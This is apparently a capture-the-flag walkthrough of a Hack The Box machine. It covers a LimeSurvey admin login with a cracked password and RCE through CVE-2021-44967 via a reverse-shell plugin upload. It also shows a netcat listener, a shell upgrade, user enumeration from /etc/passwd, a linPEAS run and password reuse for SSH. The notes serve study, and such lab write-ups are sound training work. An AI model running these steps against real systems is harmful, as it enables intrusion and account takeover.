# System Access

## Try Credentials
[User ralph access](../db-access/gaining-db-access.md#3-hashcat)

### 1. SSH Login try

```
ssh ralph@10.10.11.46
```
![img.png](../../../img/ralph-ssh-login-try.png)
- Wrong Login Credentials
---

### 2. Admin Panel Login try

```
take-survey.heal.htb/admin

Username: ralph
Password: 147258369
```
![img.png](../../../img/survey-login.png)

#### Hat geklappt:

![img_1.png](../../../img/survey-admin-panel.png)

---

# Admin Panel Enumeration

## Gefahren durch den Zugriff auf das Admin Panel

1. Survey
   - Zugriff auf die Survey + Editieren ist möglich
   - Script in die Survey eingebunden => Jeder der die Survey öffnet bekommt das Script ins Gesicht

![survey-edit.png](../../../img/survey-edit.png)
![survey-manipulation.png](../../../img/survey-manipulation.png)
![survey-script-execution.png](../../../img/survey-script-execution.png)
---

## Nach LimeSurvey CVE's gesucht

Das hier gefunden:
- https://ine.com/blog/cve-2021-44967-limesurvey-rce
- Verweist auf:
  - CVE: https://cve.mitre.org/cgi-bin/cvename.cgi?name=2021-44967
  - PoC: https://github.com/Y1LD1R1M-1337/Limesurvey-RCE
  - Exploit DB: https://www.exploit-db.com/exploits/50573


## Vorgehen:

### 1. PoC heruntergeladen (https://github.com/Y1LD1R1M-1337/Limesurvey-RCE/tree/main)
![img.png](../../../img/poc-cve-folder.png)


### 2. ```php-rev.php```
- IP und Port angepasst (Eigene IP herausgefunden mit ```ip a```)

![img.png](../../../img/php-rev-shell-script.png)



### 3. Create a zip file with the config and the reverse shell code
![img.png](../../../img/zipped-rev-shell-and-config.png)



### 4. Upload & Install Plugin

#### 4.1 Login + go to configuration
![img.png](../../../img/lime-configration.png)

#### 4.2 Under configuration navigate to the plugins
![img_1.png](../../../img/lime-plugins.png)

#### 4.3 Upload and install button
![img_2.png](../../../img/lime-plugin-upload-and-install.png)

#### 4.4 Upload & Install malicious zip file
![img.png](../../../img/lime-upload-zip.png)

#### 4.5 Error -> Wrong Lime version
![img.png](../../../img/wrong-lime-version.png)

#### 4.6 Change version in config file / add version
![img.png](../../../img/added-lime-version-in-config.png)

#### 4.7 Try again -> works
![img.png](../../../img/uploaded-zip-file.png)

#### 4.8 Activate Plugin
![img.png](../../../img/activate-plugin.png)

#### 4.9 Get Plugin id by hovering over the plugin
![img.png](../../../img/plugin-id.png)



### 5. ```exploit.py ```

#### 5.1. Script anpassen
![img.png](../../../img/exploit-plugin-id.png)

#### 5.2 Lokalen Pfad anpassen
![img.png](../../../img/path-to-rev-shell.png)

#### 5.3 Listen on ```Port 1337```
```
nc -lvp 1337

   -l: Listen mode. Netcat will wait for an incoming connection.
   -v: Verbose. Provides more detailed output.
   -p: Local port to listen on.
```
![img.png](../../../img/nc-listening.png)

#### 5.4 Exploit Datei ```exploit.py``` ausführen
```
python3 exploit.py URL username password port

python3 exploit http://take-survey.heal.htb ralph 147258369 80
```
![img.png](../../../img/exploit-execute.png)
![img_1.png](../../../img/reverse-shell-exploit.png)

- Hat geklappt => Reverse Shell erlangt als www-data User
---

# Reverse Shell
## Shell Enumeration

- Habe eine dumme shell mit der ich keine arrow key oder auto completion benutzen kann => Die
dumme shell zu einem terminal upgraden


![img.png](../../../img/shell-enumeration.png)

---
## Upgrade dumb shell to fully functional terminal to be able to enumerate better
Quelle: https://0xmrmasry.medium.com/upgrading-simple-shells-to-fully-interactive-ttys-eeeea1e6654e

### 1. Herausfinden ob ich python für ein upgrade verwenden kann
```which python3```

![img.png](../../../img/which-python.png)

### 2. ```python3 -c 'import pty; pty.spawn("/bin/bash")'```
![img.png](../../../img/get-bash.png)

### 3. STRG + Z um Netcat in den Hintergrund zu schicken
![img.png](../../../img/send-nc-to-background.png)

### 4. Terminal auf raw setzen und die Eingabe weiterleiten + danach Netcat wieder in den vordergrund holen
![img.png](../../../img/upgrade-shell-to-terminal.png)
```
stty raw -echo;fg

=>  Kombi sorgt dafür, dass die Sonderzeichen nur innerhalb speziell DIESER shell im raw format übertragen werden. 
    Wenn nicht, dann kann es dazu führen, dass alle Sonderzeichen nicht mehr interpretiert werden (auch in der shell auf meinem rechner).  
    Befehle aus dem lokalen Terminal in die Reverse Shell durchreichen.
stty raw:
=>  Sorgt dafür, dass die sonderzeichen nicht interpretiert werden sondern im raw format an die shell über echo hingesendet werden

fg (foreground):
=>  Sorgt dafür, dass die shell wieder in den vordergrund gesetzt wird
```

### 5. Arrow keys and TAB work but 'clear' doesn't
![img.png](../../../img/terminal-clear-does-not-work.png)

Herausfinden, welches Terminal ich benutze:
```
echo $TERM
```
```
Result:

xterm-256color
```
![img.png](../../../img/standard-terminal.png)

Anschließend das Terminal setzen
```
export TERM=xterm-256color
```
![img_1.png](../../../img/export-terminal.png)

### 6. TAB, Arrow keys, Auto completion works
![fully-functional-terminal.png](../../../img/fully-functional-terminal.png)

---

## Continue Enumeration
### 1. Ich bin gerade nur www-data user => sehr eingeschränkte Rechte

### 2. Prüfen, was ich als www-data mit sudo ausführen darf
```
sudo -l
```
![img.png](../../../img/www-data-sudo.png)

Geht nicht, da ich das Passwort nicht habe.

### 3. Herausfinden welche User es gibt die eine shell haben
```
cat /etc/passwd | grep 'sh$'
```
![users-with-bash.png](../../../img/users-with-bash.png)

```
root:x:0:0:root:/root:/bin/bash
ralph:x:1000:1000:ralph:/home/ralph:/bin/bash
postgres:x:116:123:PostgreSQL administrator,,,:/var/lib/postgresql:/bin/bash
ron:x:1001:1001:,,,:/home/ron:/bin/bash
```

Es gibt 3 User mit einer shell:
- ralph
- ron
- postgres

### 4. In deren Verzeichnis gehen
1. Ralph und Ron:
- haben ein Home Verzeichnis

![img.png](../../../img/home-dir-no-access-as-www-data-user.png)

Ich habe keinen Zugriff auf deren Home Verzeichnisse.

2. Postgres User:

![img.png](../../../img/postgres-directory.png)

![postgres-main-denied.png](../../../img/postgres-main-denied.png)

Kein Zugriff auf die Postgres Verzeichnisse.


## Linpeas
### Schreibzugriff finden um linpeas auf den Server zu laden
Script:
https://github.com/peass-ng/PEASS-ng/tree/master/linPEAS

1. ```/tmp``` alle rechte

![img.png](../../../img/temp-dir-all-rights.png)

2. Schreibe/Lese Rechte 

![img.png](../../../img/temp-access.png)

3. HTTP Server über Python hochfahren und das linpeas script bereitstellen

![img.png](../../../img/python-http-server.png)

4. linpeas script von Server herunterladen

![img.png](../../../img/linpeas-script-download.png)

5. Execute Rechte hinzufügen
```
chmod +x linpeas.sh
```
![img.png](../../../img/linpeas-add-execute-rights.png)


### Linpeas ausführen und auswerten

#### 1. System Infos
![img.png](../../../img/linpeas-system-infos.png)

#### 2. Linux Exploit Suggestions
![img.png](../../../img/linpeas-exploit-suggestion.png)

#### 3. Cron Jobs
![img.png](../../../img/cron-jobs.png)

#### 4. Active Ports
- Interesting because of the new Ports

![linpeas-active-ports.png](../../../img/linpeas-active-ports.png)

1. Search how to access internal ports from outside
   - ssh local port forwarding 
   - Quelle:
     - https://snapshooter.com/learn/linux/how-to-ssh-tunel-proxy
     - https://www.youtube.com/watch?v=F-ubwghsWPM

2. Need ssh password to be able to access internal ports
3. Get User access first

#### 5. Useful software / installed compilers
![img.png](../../../img/linpeas-useful-software.png)

#### 6. PostgreSQL Files
![img.png](../../../img/postgresql-files.png)

#### 6. Found config files with password

![img_1.png](../../../img/linpeas-config-password-found.png)

- Inside the config file:
![img.png](../../../img/detailed-config-file.png)



### Newly found password usage

#### 1. Try in db
![img_1.png](../../../img/ask-psql-installed.png)

```
psql -d survey -h localhost -p 5432 -U db_user -W

    -d = DB
    -h = HOST
    -p = PORT
    -U = USER
    -W = Connect via password
```
![img_2.png](../../../img/psql-db-access.png)
- Nothing of value to get user access


#### 2. Try Passwords with other Users
- Ron works

![img.png](../../../img/user-access.png)

![img.png](../../../img/user-flag.png)
![img.png](../../../img/htb-confirmed-user-flag.png)
- Now I can connect to ron via ssh with his credentials
---


# [Getting Root](../../priviledge-escalation/root-esc/getting-root.md)


---